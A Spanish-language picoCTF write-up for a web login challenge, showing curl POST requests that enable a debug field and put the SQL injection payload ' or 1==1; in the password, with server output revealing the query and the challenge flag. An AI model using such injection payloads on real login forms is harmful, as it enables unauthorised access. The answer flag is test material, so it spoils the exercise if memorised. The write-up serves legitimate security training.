
## Descripción

*There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!*

## Pistas

*There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?*

*Try to think about how the website verifies your login.*

## Solución

*WebShell*
```
ceciSolis-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/39720/login.php -d "username-admin&password=password&debug=1"       
<pre>username: 
password: password
SQL query: SELECT * FROM users WHERE name='' AND password='password'
ceciSolis-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/39720/login.php -d "username-admin&password=' or 1==1;&debug=1"     
<pre>username: 
password: ' or 1==1;
SQL query: SELECT * FROM users WHERE name='' AND password='' or 1==1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_c218b685}</p>ceciSolis-picoctf@webshell:~$ 
```

picoCTF{s0m3_SQL_c218b685


*HTML*

```
#esto es lo que se cambia el debug a 1 que es verdadero, la inyeccion sql es la contraseña se logea y muestra la bandera
<input type="hidden" name="debug" value="1">

username: admin 
password: ' or 1 == 1;
SQL query: SELECT * FROM users WHERE name='admin ' AND password='' or 1 == 1;'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_c218b685}
```
picoCTF{s0m3_SQL_c218b685}
## Notas Adicionales 

*Con curl menos s mandamos llamar el servidor del limk que le pasamos  y sea silencioso despues agregamos el link, luego la -d significa que es un metodo post y le enviamos los datos del post que es el nombre de usuario y la contraseña, se unen con un amperson los campos, despues de activa el campo de debug en 1 que sea true, aunque nos da acceso invalido, cambiamos la contraseña por la inyeccion sql 'or 1 = = 1;* 
*Finalmente ya nos muestra la badnera que necesitabamos*

## Referencias 

https://jupiter.challenges.picoctf.org/problem/39720/
http://jupiter.challenges.picoctf.org:39720
https://jupiter.challenges.picoctf.org/problem/39720/login.php
